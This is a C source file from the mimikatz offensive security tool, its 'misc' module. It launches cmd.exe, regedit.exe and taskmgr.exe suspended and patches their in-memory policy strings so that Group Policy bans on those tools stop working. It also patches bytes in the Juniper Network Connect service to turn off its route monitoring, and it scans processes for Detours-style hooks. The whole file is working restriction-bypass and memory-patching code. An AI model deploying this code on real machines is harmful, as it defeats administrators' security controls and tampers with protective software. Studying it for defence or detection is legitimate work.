/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by/3.0/fr/
*/
#include "kuhl_m_misc.h"

const KUHL_M_C kuhl_m_c_misc[] = {
	{kuhl_m_misc_cmd,		L"cmd",			L"Command Prompt          (without DisableCMD)"},
	{kuhl_m_misc_regedit,	L"regedit",		L"Registry Editor         (without DisableRegistryTools)"},
	{kuhl_m_misc_taskmgr,	L"taskmgr",		L"Task Manager            (without DisableTaskMgr)"},
	{kuhl_m_misc_ncroutemon,L"ncroutemon",	L"Juniper Network Connect (without route monitoring)"},
	{kuhl_m_misc_detours,	L"detours",		L"[experimental] Try to enumerate all modules with Detours-like hooks"},
};
const KUHL_M kuhl_m_misc = {
	L"misc",	L"Miscellaneous module",	NULL,
	sizeof(kuhl_m_c_misc) / sizeof(KUHL_M_C), kuhl_m_c_misc, NULL, NULL
};

NTSTATUS kuhl_m_misc_cmd(int argc, wchar_t * argv[])
{
	kuhl_m_misc_generic_nogpo_patch(L"cmd.exe", L"DisableCMD", sizeof(L"DisableCMD"), L"KiwiAndCMD", sizeof(L"KiwiAndCMD"));
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_misc_regedit(int argc, wchar_t * argv[])
{
	kuhl_m_misc_generic_nogpo_patch(L"regedit.exe", L"DisableRegistryTools", sizeof(L"DisableRegistryTools"), L"KiwiAndRegistryTools", sizeof(L"KiwiAndRegistryTools"));
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_misc_taskmgr(int argc, wchar_t * argv[])
{
	kuhl_m_misc_generic_nogpo_patch(L"taskmgr.exe", L"DisableTaskMgr", sizeof(L"DisableTaskMgr"), L"KiwiAndTaskMgr", sizeof(L"KiwiAndTaskMgr"));
	return STATUS_SUCCESS;
}

BYTE PTRN_WALL_ncRouteMonitor[] = {0x07, 0x00, 0x75, 0x3a, 0x68};
BYTE PATC_WALL_ncRouteMonitor[] = {0x90, 0x90};
KULL_M_PATCH_GENERIC ncRouteMonitorReferences[] = {{KULL_M_WIN_BUILD_XP, {sizeof(PTRN_WALL_ncRouteMonitor), PTRN_WALL_ncRouteMonitor}, {sizeof(PATC_WALL_ncRouteMonitor), PATC_WALL_ncRouteMonitor}, {2}}};
NTSTATUS kuhl_m_misc_ncroutemon(int argc, wchar_t * argv[])
{
	kull_m_patch_genericProcessOrServiceFromBuild(ncRouteMonitorReferences, sizeof(ncRouteMonitorReferences) / sizeof(KULL_M_PATCH_GENERIC), L"dsNcService", NULL, TRUE);
	return STATUS_SUCCESS;
}

BOOL CALLBACK kuhl_m_misc_detours_callback_module_name_addr(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
{
	if(((PBYTE) pvArg >= (PBYTE) pModuleInformation->DllBase.address) && ((PBYTE) pvArg < ((PBYTE) pModuleInformation->DllBase.address + pModuleInformation->SizeOfImage)))
	{
		kprintf(L"\t(%wZ)", pModuleInformation->NameDontUseOutsideCallback);
		return FALSE;
	}
	return TRUE;
}

PBYTE kuhl_m_misc_detours_testHookDestination(PKULL_M_MEMORY_ADDRESS base, WORD machineOfProcess, DWORD level)
{
	PBYTE dst = NULL;
	BYTE bufferJmp[] = {0xe9}, bufferJmpOff[] = {0xff, 0x25}, bufferRetSS[]	= {0x50, 0x48, 0xb8};
	KUHL_M_MISC_DETOURS_HOOKS myHooks[] = {
		{0, bufferJmp,		sizeof(bufferJmp),		sizeof(bufferJmp),		sizeof(LONG), TRUE, FALSE},
		{1, bufferJmpOff,	sizeof(bufferJmpOff),	sizeof(bufferJmpOff),	sizeof(LONG), !(machineOfProcess == IMAGE_FILE_MACHINE_I386), TRUE},
		{0, bufferRetSS,	sizeof(bufferRetSS),	sizeof(bufferRetSS),	sizeof(PVOID), FALSE, FALSE},
	};
	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aBuffer = {NULL, &hBuffer}, dBuffer = {&dst, &hBuffer};
	KULL_M_MEMORY_ADDRESS pBuffer = *base;
	DWORD i, sizeToRead;

	for(i = 0; !dst && (i < sizeof(myHooks) / sizeof(KUHL_M_MISC_DETOURS_HOOKS)); i++)
	{
		if(level >= myHooks[i].minLevel)
		{
			sizeToRead = myHooks[i].offsetToRead + myHooks[i].szToRead;
			if(aBuffer.address = LocalAlloc(LPTR, sizeToRead))
			{
				if(kull_m_memory_copy(&aBuffer, base, sizeToRead))
				{
					if(RtlEqualMemory(myHooks[i].pattern, aBuffer.address, myHooks[i].szPattern))
					{
						if(myHooks[i].isRelative)
						{
							dst = (PBYTE) pBuffer.address + sizeToRead + *(PLONG) ((PBYTE) aBuffer.address + myHooks[i].offsetToRead);
						}
						else
						{
							dst = *(PBYTE *) ((PBYTE) aBuffer.address + myHooks[i].offsetToRead);
#ifdef _M_X64
							if(machineOfProcess == IMAGE_FILE_MACHINE_I386)
								dst = (PBYTE) ((ULONG_PTR) dst & 0xffffffff);
#endif
						}

						if(myHooks[i].isTarget)
						{
							pBuffer.address = dst;
							kull_m_memory_copy(&dBuffer, &pBuffer, sizeof(PBYTE));
#ifdef _M_X64
							if(machineOfProcess == IMAGE_FILE_MACHINE_I386)
								dst = (PBYTE) ((ULONG_PTR) dst & 0xffffffff);
#endif

						}
					}
				}
				LocalFree(aBuffer.address);
			}
		}
	}
	return dst;
}

BOOL CALLBACK kuhl_m_misc_detours_callback_module_exportedEntry(PKULL_M_PROCESS_EXPORTED_ENTRY pExportedEntryInformations, PVOID pvArg)
{
	PBYTE dstJmp = NULL;
	KULL_M_MEMORY_ADDRESS pBuffer = pExportedEntryInformations->function;
	DWORD level = 0;

	if((pExportedEntryInformations->function.address))
	{
		do
		{
			pBuffer.address = kuhl_m_misc_detours_testHookDestination(&pBuffer, pExportedEntryInformations->machine, level);
			if(pBuffer.address && ((PBYTE) pBuffer.address < (PBYTE) (((PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION) pvArg)->DllBase.address) || (PBYTE) pBuffer.address > ((PBYTE) ((PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION) pvArg)->DllBase.address + (((PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION) pvArg)->SizeOfImage))))
			{
				dstJmp = (PBYTE) pBuffer.address;
				level++;
			}
		} while (pBuffer.address);

		if(dstJmp)
		{
			kprintf(L"\t[%u] %wZ ! ", level, (((PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION) pvArg)->NameDontUseOutsideCallback));

			if(pExportedEntryInformations->name)
				kprintf(L"%-32S", pExportedEntryInformations->name);
			else
				kprintf(L"# %u", pExportedEntryInformations->ordinal);

			kprintf(L"\t %p -> %p", pExportedEntryInformations->function.address, dstJmp);
			kull_m_process_getVeryBasicModuleInformations(pExportedEntryInformations->function.hMemory, kuhl_m_misc_detours_callback_module_name_addr, dstJmp);
			kprintf(L"\n");
		}
	}
	return TRUE;
}

BOOL CALLBACK kuhl_m_misc_detours_callback_module(PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation, PVOID pvArg)
{
	kull_m_process_getExportedEntryInformations(&pModuleInformation->DllBase, kuhl_m_misc_detours_callback_module_exportedEntry, pModuleInformation);
	return TRUE;
}

BOOL CALLBACK kuhl_m_misc_detours_callback_process(PSYSTEM_PROCESS_INFORMATION pSystemProcessInformation, PVOID pvArg)
{
	HANDLE hProcess;
	PKULL_M_MEMORY_HANDLE hMemoryProcess;
	DWORD pid = (DWORD) pSystemProcessInformation->UniqueProcessId;

	if(pid > 4)
	{
		kprintf(L"%wZ (%u)\n", &pSystemProcessInformation->ImageName, pid);
		if(hProcess = OpenProcess(GENERIC_READ, FALSE, pid))
		{
			if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &hMemoryProcess))
			{
				kull_m_process_getVeryBasicModuleInformations(hMemoryProcess, kuhl_m_misc_detours_callback_module, NULL);
				kull_m_memory_close(hMemoryProcess);
			}
			CloseHandle(hProcess);
		}
		else
			PRINT_ERROR_AUTO(L"OpenProcess");
	}
	return TRUE;
}

NTSTATUS kuhl_m_misc_detours(int argc, wchar_t * argv[])
{
	kull_m_process_getProcessInformation(kuhl_m_misc_detours_callback_process, NULL);
	return STATUS_SUCCESS;
}

BOOL kuhl_m_misc_generic_nogpo_patch(PCWSTR commandLine, PWSTR disableString, SIZE_T szDisableString, PWSTR enableString, SIZE_T szEnableString)
{
	BOOL status = FALSE;
	PEB Peb;
	PROCESS_INFORMATION processInformation;
	PIMAGE_NT_HEADERS pNtHeaders;
	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aBaseAdress = {NULL, NULL}, aPattern = {disableString, &hLocalMemory}, aPatch = {enableString, &hLocalMemory};
	KULL_M_MEMORY_SEARCH sMemory;
	
	if(kull_m_process_create(KULL_M_PROCESS_CREATE_NORMAL, commandLine, CREATE_SUSPENDED, NULL, 0, NULL, NULL, NULL, &processInformation, FALSE))
	{
		if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, processInformation.hProcess, &aBaseAdress.hMemory))
		{
			if(kull_m_process_peb(aBaseAdress.hMemory, &Peb, FALSE))
			{
				aBaseAdress.address = Peb.ImageBaseAddress;

				if(kull_m_process_ntheaders(&aBaseAdress, &pNtHeaders))
				{
					sMemory.kull_m_memoryRange.kull_m_memoryAdress.hMemory = aBaseAdress.hMemory;
					sMemory.kull_m_memoryRange.kull_m_memoryAdress.address = (LPVOID) pNtHeaders->OptionalHeader.ImageBase;
					sMemory.kull_m_memoryRange.size = pNtHeaders->OptionalHeader.SizeOfImage;

					if(status = kull_m_patch(&sMemory, &aPattern, szDisableString, &aPatch, szEnableString, 0, NULL, 0, NULL, NULL))
						kprintf(L"Patch OK for \'%s\' from \'%s\' to \'%s\' @ %p\n", commandLine, disableString, enableString, sMemory.result);
					else PRINT_ERROR_AUTO(L"kull_m_patch");
					LocalFree(pNtHeaders);
				}


			}
			kull_m_memory_close(aBaseAdress.hMemory);
		}
		NtResumeProcess(processInformation.hProcess);
		CloseHandle(processInformation.hThread);
		CloseHandle(processInformation.hProcess);
	}
	return status;
}